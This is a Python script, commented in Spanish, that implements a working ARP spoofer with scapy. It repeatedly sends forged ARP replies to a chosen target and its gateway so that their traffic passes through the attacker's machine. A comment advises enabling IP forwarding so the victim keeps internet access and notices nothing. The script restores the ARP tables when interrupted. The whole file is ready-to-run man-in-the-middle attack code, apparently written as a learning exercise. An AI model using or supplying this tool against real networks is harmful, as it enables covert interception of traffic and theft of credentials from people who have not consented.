import scapy.all as scapy
import time
import optparse


# Funcion para obtener los argumentos
def get_arguments():
    parser = optparse.OptionParser() 

    parser.add_option("-t", "--target_ip", dest = "target_ip", help = "Target IP")
    parser.add_option("-g", "--gateway_ip", dest = "gateway_ip", help = "IP Spoof")

    (options, arguments) = parser.parse_args() 

    if not options.target_ip:
        parser.error("[-] Indicar IP objetivo, usa --help para mas informacion")
    elif not options.gateway_ip:
        parser.error("[-] Indicar IP del Gateway, usa --help para mas informacion")
    return options 


def get_mac(ip):
    
    arp_request = scapy.ARP(pdst = ip) # ARP request para preguntar que dispositivo tiene el IP indicado
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # lista de las respuestas ARP
    
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # op = 2 para que sea un paquete arp response, indicandole a la maquina victima que la direccion spoof_ip(ip del atacante) es el router.
    scapy.send(packet, verbose = False)


# restaurar tablas ARP de la victima
def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    source_mac = get_mac(src_ip)
    packet = scapy.ARP(op = 2, pdst = dst_ip, hwdst = dst_mac, psrc = src_ip, hwsrc = source_mac) # op = 2 para que sea un paquete arp response, indicandole a la maquina victima que la direccion spoof_ip(ip del atacante) es el router.
    scapy.send(packet, count = 4, verbose = False)

options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip


sent_packet_count = 0   # contador de paquetes

# ejecutar en consola: echo 1 > proc/sys/net/ipv4/ip_forward para forwardear las solicitudes de la maquina victima y que pueda acceder a internet
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent: " + str(sent_packet_count), end = "")     # \r  para impresion dinamica, se actualiza la misma linea en consola
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Restaurando tablas ARP...")
    print("[+] CTRL + C... Cerrando ARP Spoofer\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)